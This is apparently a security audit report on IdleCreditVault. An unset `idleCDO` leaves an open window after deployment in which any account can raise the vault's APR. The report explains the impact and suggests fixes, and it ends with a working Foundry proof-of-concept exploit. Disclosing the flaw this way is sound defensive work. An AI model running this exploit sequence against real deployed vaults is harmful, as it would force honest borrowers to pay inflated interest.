### Title
Uninitialized `idleCDO` allows unauthenticated APR manipulation before CDO whitelisting - ([File: `contracts/strategies/idle/IdleCreditVault.sol`])

### Summary
`IdleCreditVault.initialize` does not initialize `idleCDO`, leaving it as `address(0)` until the owner separately calls `setWhitelistedCDO`. During that setup window, `setApr`, `setAprs`, and `setAprsWithBuffer` intentionally skip their CDO/manager authorization check, allowing any unprivileged account to set the vault APR up to `maxApr`. This closely matches the referenced uninitialized-variable bug class and can force an honest borrower to fund inflated interest.

### Finding Description
`idleCDO` is the sole authorization anchor for privileged strategy operations, but it is absent from `initialize`; the initializer only sets the token, borrower, manager, APRs, and recovery flag. [1](#0-0) 

The exposed APR path explicitly bypasses authorization whenever `idleCDO == address(0)`:

```solidity
address _cdo = idleCDO;
if (_cdo != address(0)) {
  if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
}
lastApr = _apr;
``` [2](#0-1) 

Both `setAprs` and `setAprsWithBuffer` also modify `unscaledApr` before reaching this bypass. [3](#0-2) 

The CDO address is populated only later through the owner-only `setWhitelistedCDO`, creating a deployment/configuration window rather than atomically establishing authorization during initialization. [4](#0-3) 

Factory deployment configures the APR and CDO in one transaction, so factory-created vaults are not exposed to this gap. [5](#0-4)  However, the repository’s manual deployment flow performs `setWhitelistedCDO` as a later transaction, leaving the vulnerable window open for manually deployed or upgraded vaults. [6](#0-5) 

### Impact Explanation
An attacker can initialize or observe a deployed strategy while `idleCDO == address(0)`, call `setAprs(20e18, 20e18)`, and wait for the honest owner to whitelist the CDO and begin normal operation. Once whitelisted, ordinary callers can no longer change the APR because `_onlyIdleCDO` and the `setApr` authorization path become active. [7](#0-6) 

During `startEpoch`, the CDO calculates `expectedEpochInterest` from `_calcInterest(getContractValue())`, which consumes the attacker-controlled strategy APR. [8](#0-7)  At `stopEpoch`, the CDO pulls that interest plus pending withdrawal funding from the borrower through `getFundsFromBorrower`. [9](#0-8) 

For a vault with 1,000,000 underlying units and the default `maxApr` of `20e18`, the attacker can impose up to a 20% annualized borrower rate rather than the intended APR. The resulting excess interest accrues to the CDO and therefore to LP/tranche holders, including an attacker who deposited before the epoch.

### Likelihood Explanation
The attack requires a non-atomic deployment/configuration sequence in which the owner initializes the strategy and later sets the whitelisted CDO. That sequence is explicitly supported by the codebase because `setApr` contains a setup-only bypass and the deployment task sets the CDO in a separate transaction. [2](#0-1) [6](#0-5) 

The attacker does not need a privileged role, borrower cooperation, malformed oracle data, or a contract vulnerability outside the strategy. A KYC-passing lender can deposit after the APR manipulation and receive the inflated yield paid by the honest borrower. The impact is bounded by `maxApr`, which defaults to `DEFAULT_MAX_APR = 20e18`. [10](#0-9) 

### Recommendation
Do not leave APR configuration permissionless while `idleCDO` is unset.

Use one of the following approaches:

- Add an owner-only setup setter, such as `initializeAprs`, which is usable only while `idleCDO == address(0)`, and remove the public bypass from `setApr`.
- Add an explicit `aprConfigured` / `cdoConfigured` state machine and require the owner to finalize configuration before deposits or epoch startup.
- Require `setApr` to enforce `msg.sender == idleCDO || msg.sender == manager` unconditionally, and expose a separate `onlyOwner` configuration path for the setup phase.
- Prefer atomic deployment through the factory so initialization, APR configuration, and CDO whitelisting cannot be interleaved by an attacker.

### Proof of Concept
The following Foundry test demonstrates the vulnerable sequence on a mainnet fork. The attacker modifies the APR only because `idleCDO` is still zero; after whitelisting, the same call reverts.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import "../../contracts/IdleCDOCreditVault.sol";
import "../../contracts/IdleCDOEpochVariant.sol";
import "../../contracts/interfaces/IERC20Detailed.sol";
import "../../contracts/strategies/idle/IdleCreditVault.sol";

contract IdleCreditVaultUninitializedCDOPoC is Test {
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDC_WHALE = 0x55FE002aefF02F77364de339a1292923A15844B8;

    address internal owner = makeAddr("owner");
    address internal manager = makeAddr("manager");
    address internal borrower = makeAddr("borrower");
    address internal attacker = makeAddr("attacker");
    address internal proxyAdmin = makeAddr("proxyAdmin");

    IdleCreditVault internal strategy;
    IdleCDOEpochVariant internal cdo;
    IERC20Detailed internal usdc = IERC20Detailed(USDC);

    uint256 internal constant DEPOSIT = 1_000_000e6;
    uint256 internal constant HONEST_APR = 1e18;
    uint256 internal constant ATTACK_APR = 20e18;

    function setUp() public {
        vm.createSelectFork("mainnet");

        IdleCreditVault strategyImpl = new IdleCreditVault();
        strategy = IdleCreditVault(address(new TransparentUpgradeableProxy(
            address(strategyImpl),
            proxyAdmin,
            abi.encodeWithSelector(
                IdleCreditVault.initialize.selector,
                USDC,
                owner,
                manager,
                borrower,
                "Borrower",
                HONEST_APR
            )
        )));

        IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
        cdo = IdleCDOEpochVariant(address(new TransparentUpgradeableProxy(
            address(cdoImpl),
            proxyAdmin,
            abi.encodeWithSelector(
                IdleCDOCreditVault.initialize.selector,
                0,
                USDC,
                owner,
                owner,
                address(0),
                address(strategy),
                100_000
            )
        )));
    }

    function test_UninitializedIdleCDOPermitsUnauthorizedAprChange() public {
        assertEq(strategy.idleCDO(), address(0));

        // Unauthorized setup-window manipulation.
        vm.prank(attacker);
        strategy.setAprs(ATTACK_APR, ATTACK_APR);

        assertEq(strategy.unscaledApr(), ATTACK_APR);
        assertEq(strategy.getApr(), ATTACK_APR);

        // Honest deployment step completes the strategy/CDO wiring.
        vm.prank(owner);
        strategy.setWhitelistedCDO(address(cdo));

        // After initialization is completed, the unauthorized path is closed.
        vm.prank(attacker);
        vm.expectRevert(NotAllowed.selector);
        strategy.setApr(HONEST_APR);

        // Attacker becomes the sole LP.
        vm.prank(USDC_WHALE);
        usdc.transfer(attacker, DEPOSIT);

        vm.startPrank(attacker);
        usdc.approve(address(cdo), DEPOSIT);
        cdo.depositAA(DEPOSIT);
        vm.stopPrank();

        // Honest owner starts the buffer-configured epoch without noticing the APR change.
        vm.prank(owner);
        cdo.startEpoch();

        uint256 inflatedInterest = cdo.expectedEpochInterest();
        assertGt(inflatedInterest, 0);

        // Honest borrower funds the inflated principal-plus-interest recall.
        deal(USDC, borrower, DEPOSIT + inflatedInterest);
        vm.prank(borrower);
        usdc.approve(address(cdo), DEPOSIT + inflatedInterest);

        uint256 borrowerBefore = usdc.balanceOf(borrower);

        vm.warp(block.timestamp + cdo.epochDuration());
        vm.prank(owner);
        cdo.stopEpoch(0, 1);

        uint256 borrowerPaid = borrowerBefore - usdc.balanceOf(borrower);
        assertEq(borrowerPaid, DEPOSIT + inflatedInterest);

        // The inflated interest is now controlled by the CDO/tranche position.
        assertGt(cdo.virtualPrice(cdo.AATranche()), 1e18);
    }
}
```
